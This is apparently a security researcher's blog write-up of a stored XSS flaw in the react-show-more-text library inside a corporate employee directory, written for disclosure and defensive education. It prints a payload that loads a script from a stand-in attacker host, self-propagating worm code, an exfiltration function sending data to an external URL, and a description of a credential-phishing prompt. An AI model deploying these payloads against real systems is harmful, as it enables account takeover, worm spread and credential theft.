---
title: "How a Zero-Day in a React Library Exposed Corporate Data, Employee Credentials, and Financial Assets"
slug: "react-supply-chain-xss-worm"
date: 2025-12-28
description: "A React supply-chain zero-day that transformed an innocuous OOO field into a wormable corporate attack primitive."
tags: ["XSS", "Supply Chain", "Zero-Day", "Credential Harvesting", "Red Teaming"]
categories: ["Security Research"]
featured_image: "featured.jpg"
---

## Executive Summary

While working at a large global security organization, I identified a critical security vulnerability in an internal React-based application known as the *Employee Directory*. The investigation began with a routine test of an “Out of Office” (OOO) message field and evolved into the discovery of a **zero-day vulnerability in a widely used open-source React library**, ultimately resulting in a **wormable stored XSS condition**.

By chaining backend trust in frontend validation with a supply-chain flaw in a UI dependency, I demonstrated how an attacker could execute arbitrary JavaScript across a trusted corporate domain. This capability enabled **credential harvesting**, **lateral movement across internal systems**, and **direct interaction with sensitive financial workflows**, including expense management, travel approvals, and ESPP data.

The exploit required no user interaction beyond viewing an infected profile and executed entirely within authenticated browser sessions, bypassing many traditional perimeter defenses.

*All findings were validated under controlled conditions and disclosed responsibly; no production data was harmed.*

{{< alert icon="shield" cardColor="#700d0d91" iconColor="#f1faee" >}}
**Vulnerability Risk Assessment: CRITICAL**

- **Vector:** Stored XSS via third-party dependency  
- **Impact:** Credential theft, lateral movement, financial manipulation  
- **Exploitability:** High (wormable, zero-click under common layouts)  
- **Root Cause:** Backend trust in frontend input combined with unsafe UI abstraction  
{{< /alert >}}

---

## Initial Discovery: Backend Trust in Frontend Validation

The *Employee Directory* application is hosted on `internal.corporate.com`, a privileged internal domain that also serves several high-impact systems, including expense management, travel workflows, time-off requests, and the Employee Stock Purchase Plan (ESPP). As such, any client-side execution on this origin carries elevated risk.

Initial testing involved submitting simple HTML markup (e.g., `<b>Away</b>`) into the OOO field. The frontend correctly stripped the markup, suggesting that client-side sanitization was in place. However, inspection of the network traffic revealed that this protection existed solely in the UI layer.

Replaying the request directly against the backend API using Postman demonstrated that the server accepted and persisted raw HTML without any sanitization:

`PUT /api/user/ooo-message`

Upon refreshing the profile, the injected HTML rendered correctly, confirming that untrusted input was stored verbatim in the backend and later rendered in the browser. This behavior established a classic stored-XSS precondition.



At this point, the remaining question was why the payload executed inside a React application that should escape string content by default.

---

## Root Cause: A Supply-Chain Zero-Day in `react-show-more-text`

It turned out that the execution sink was not introduced by the organization’s application code.. Instead, it originated from a third-party dependency: `react-show-more-text`, a popular React component used to truncate and expand text while preserving clickable links.

To support link preservation, the library performs a series of non-trivial operations on raw HTML strings. In doing so, it bypasses React’s default escaping guarantees and ultimately renders content using `dangerouslySetInnerHTML`.

At a high level, the vulnerable logic flow is as follows:

1. User-controlled input enters the component as a string  
2. React safely escapes the string during the initial render  
3. The library assigns the escaped string to `innerHTML` for off-DOM layout measurement  
4. The content is extracted via `textContent`, preserving HTML entities  
5. The string is re-injected into the DOM using `dangerouslySetInnerHTML`

If the content fits within the layout constraints (i.e., truncation is not triggered), the payload remains structurally intact and executes when rendered.

```javascript
// Truncate.js (unpatched)
createMarkup = (str) => {
    return <span dangerouslySetInnerHTML={{ __html: str }} />;
};
```

This behavior is not accidental misuse but an architectural flaw caused by combining layout measurement, HTML string manipulation, and an explicit HTML injection sink without sanitization.

A full technical breakdown of the vulnerability, including DOM lifecycle analysis and the remediation patch, is documented separately:
👉 [Exploiting Layout Logic for DOM XSS in react-show-more-text]({{< relref "cve-xss-react-show-more-text" >}})

## Weaponization: From Stored XSS to Worm

To demonstrate the true impact of the vulnerability, I shifted from a simple `<b>` to a more sophisticated payload designed to fetch and execute external script logic via a remote server:

```html
<img src=x onerror="with(document)head.appendChild(createElement('script')).src='//attacker-controlled-endpoint.com/worm.js'">
```

By utilizing `with(document)`, I was able to bypass character limits and streamline the DOM manipulation required to inject the remote script tag, ensuring the payload remained small enough to avoid being 'sliced' by the library's truncation logic.

{{< gallery >}}
    <img src="media/profile_no_xss.png" class="grid-w50" alt="Employee profile page before injection" />
    <img src="media/profile_w_xss.png" class="grid-w50" alt="Employee profile page showing an injected Out-of-Office message containing a broken image icon used as the XSS execution vector" />
    <figcaption>
        <em>
        Figure 1: Employee profile before and after OOO message injection. The broken image icon marks the XSS execution point.
        </em>
    </figcaption>
{{< /gallery >}}

### The Worm

Once arbitrary JavaScript execution was achieved on `internal.corporate.com`, the browser effectively became a trusted execution environment. I then developed a self-propagating, multi-stage payload (a worm) designed to propagate autonomously using the victim’s authenticated session.

The worm logic updated the victim’s OOO message via internal APIs, thereby infecting additional profiles. To reduce detection and suspicion, the payload avoided users who already had an OOO message set and immediately removed visible artifacts (such as broken image icons) from the DOM.

```javascript
if (!alreadyInfected && !userHasAwayMessage) {
    await infect(csrfToken);
}

async function infect(csrf) {
    await fetch(SET_OOO_MESSAGE_API, {
        method: "PUT",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            description: `<img src=x onerror=with(document)head.appendChild(createElement('script')).src='//attacker-controlled-endpoint.com/worm.js'>`
        })
    });
}
```

Because the *Employee Directory* application is one of the most frequently accessed internal applications, this mechanism enabled rapid and reliable propagation without requiring any user interaction.

*Note: To prevent unintended spread, the worm’s propagation logic was explicitly gated behind a runtime safety flag and did not execute unless manually enabled during controlled testing.*

## Credential Harvesting via Contextual Trust Abuse
I then implemented a credential harvesting interface that precisely mimicked the native Chrome / Active Directory re-authentication prompt, including animations, visual depth, and interaction behavior. With code execution occurring on a trusted corporate origin, traditional phishing indicators were effectively neutralized.

The prompt appeared inline, without redirects or domain changes, and leveraged the fact that employees routinely encounter such dialogs during normal workflows. Keyboard escape paths were suppressed, and usernames were validated in real time to increase credibility.

During controlled testing, a senior developer from the internal tools team accidentally entered valid Active Directory credentials into the phishing authentication prompt, believing it to be a legitimate re-authentication request. This confirmed that, when rendered within a trusted corporate origin, the prompt was indistinguishable from native authentication flows.

{{< gallery >}}
    <img src="media/phishing_light.png" class="grid-w50" 
     alt="Pixel-accurate phishing re-authentication prompt rendered inline within a trusted corporate origin (light mode)" />
    <img src="media/phishing_dark.png" class="grid-w50" 
     alt="The same phishing re-authentication prompt automatically adapting to the browser’s dark theme." />
    <figcaption>
        <em>
        Figure 2: Contextual phishing rendered inside a trusted corporate origin, dynamically adapting to browser theme (light and dark modes) to maximize legitimacy
        </em>
    </figcaption>
{{< /gallery >}}

This demonstrated that XSS inside a trusted enterprise domain effectively collapses the boundary between legitimate authentication flows and attacker-controlled UI.

### Lateral Movement and Data Exfiltration
Because the exploit executed within an authenticated session on `internal.corporate.com`, it inherited the victim’s existing access rights.
This enabled direct interaction with internal APIs related to expense approvals, travel approvals, and ESPP data. In addition, if a payroll team member got infected, it would give the attacker access to the admin panel of the ESPP application, where they could initiate ESPP-related actions on behalf of other employees.

{{< gallery >}}
    <img src="media/espp.png" class="grid-w50" alt="Authenticated internal ESPP managment sytem accessible from a compromised corporate browser session." />
    <img src="media/expense.png" class="grid-w50" alt="Authenticated internal Expenses managment sytem accessible from a compromised corporate browser session." />
    <figcaption>
        <em>
        Figure 3: Internal financial systems reachable through an authenticated session after successful exploitation
        </em>
    </figcaption>
{{< /gallery >}}

While direct cross-origin exfiltration was partially restricted, I observed that `OPTIONS` preflight requests were insufficiently filtered. This allowed payloads to be exfiltrated via query parameters during forced preflight requests, demonstrating a viable data leakage channel even under restrictive CORS conditions.

*Note: The mechanism was validated exclusively using non-sensitive, synthetic test payloads to confirm feasibility, not to extract production data.*

```javascript
async function exfiltrate(data) {
    const payload = btoa(JSON.stringify(data));
    await fetch(`${EXFIL_URL}?data=${payload}`, {
        method: "POST",
        headers: { "X-Force-Preflight": "1" }
    });
}
```

---

## Contributing Factors (Summary)

This incident was enabled by a convergence of design and trust assumptions rather than a single isolated flaw:

- **Backend trust in frontend validation**, allowing unsanitized HTML to be persisted
- **A third-party UI component** that bypassed React’s escaping guarantees for layout and link handling
- **Execution within a high-trust corporate domain**, amplifying the blast radius of client-side code execution
- **Absence of compensating client-side controls** (e.g., restrictive CSP) to mitigate DOM-based injection

Individually, none of these issues would necessarily result in critical impact. Combined, they created a wormable exploitation path.

---

## Ethical Disclosure & Remediation

All findings were disclosed responsibly to the organization’s cybersecurity leadership. I provided a complete proof-of-concept, source code, and detailed remediation guidance, including recommendations to enforce backend HTML sanitization and audit third-party UI components for undocumented HTML parsing behavior.

**Vulnerability Status & Coordination:** I identified the root cause within a third-party dependency and developed a functional patch. I initiated a coordinated disclosure process with the maintainer; however, as the upstream project has become unresponsive, I have maintained a [hard fork](https://github.com/ronyut/react-show-more-text) with the security fix to ensure the safety of my own implementations.

**Impact & Scope:** The affected application was an internal, non-customer-facing system. No customer data or customer-facing products were impacted, and no sensitive production data was altered, misused, or exfiltrated during this research.

**Anonymization:** All domains, system names, screenshots, dates, and visual elements in this write-up have been anonymized or modified. Any resemblance to specific organizations is incidental and not intended as attribution.


---

## Conclusion

This research demonstrates how security failures often emerge at abstraction boundaries. A single helper component, written with legitimate goals, silently bypassed React’s safety model and enabled a high-impact supply-chain vulnerability.

When trusted frontend frameworks, backend assumptions, and third-party dependencies intersect without explicit trust boundaries, a single unsafe design choice can invalidate extensive defensive investments. Identifying and mitigating these architectural fault lines is essential to securing modern web applications.

---

**Identifying these architectural gaps is where I thrive. If you are looking for a researcher who understands how to build — and how to break — I would be glad to connect.**

**[Let's connect on LinkedIn](https://www.linkedin.com/in/rony-utevsky/)**